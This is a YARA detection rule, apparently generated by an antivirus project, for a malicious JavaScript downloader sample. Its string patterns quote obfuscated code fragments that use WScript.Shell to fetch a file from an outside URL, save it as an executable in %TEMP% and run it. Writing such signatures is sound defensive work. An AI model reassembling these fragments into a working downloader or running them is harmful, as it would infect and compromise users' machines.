rule sig_20160328_b425e7bbc17661fb09671baa7bd2027d {
  meta:
    description = "datamaliciousorder - file 20160328_b425e7bbc17661fb09671baa7bd2027d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6afccaf36e4de5122c88122f803710a2f1275e8712e11d2946abf16915bdd918"

  strings:
    $s1  = "function Ijphwfrgj() {return Kdhsc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"HYvRi1uGex.exe\";};" fullword ascii
    $s2  = "do {WScript[Rrtlhhev](Ngdsxwcx() * 11)} while (Ekbdmovc[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Ukoaennyqz(Bvwbqmenp, Sembilh){return Bvwbqmenp - Sembilh;};" fullword ascii
    $s4  = "var Kdhsc = function Xcuxvkorip() {return WScript[Ufyvfmvns](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Ekbdmovc[Uzzzu](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s6  = "function Navamfatv(Hkzezrztg){Kdhsc[\"Run\"](Hkzezrztg, Wagkatqv, Wagkatqv);};" fullword ascii
    $s7  = "function Vakshow() {return ((Nfdpnuzey == true) && (Nfdpnuzey == Jztgcmgsh)) ? 1 : Wagkatqv;};" fullword ascii
    $s8  = "var Qjmtkjy = false;" fullword ascii
    $s9  = "function Kczsz()" fullword ascii
    $s10 = "function Ngdsxwcx(){return 22;};" fullword ascii
    $s11 = "return Ukoaennyqz(Pkzfpad, Sifmpijl);" fullword ascii
    $s12 = "function Lbvlvo(Rdcrbv) {var Xatlh = (1, 2, 3, 4, 5, Rdcrbv); return Xatlh;};" fullword ascii
    $s13 = "Nfdpnuzey = true; " fullword ascii
    $s14 = " while (Rcxgy){" fullword ascii
    $s15 = "var Jztgcmgsh = false;" fullword ascii
    $s16 = "var Nfdpnuzey = false;" fullword ascii
    $s17 = "Jztgcmgsh = true; " fullword ascii
    $s18 = "var Yufaucnlcf = new this[\"Date\"]();" fullword ascii
    $s19 = "function Fjggdpd(){return Ufyvfmvns;};" fullword ascii
    $s20 = "function Rkcona(){return Hxtbbumrxk;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}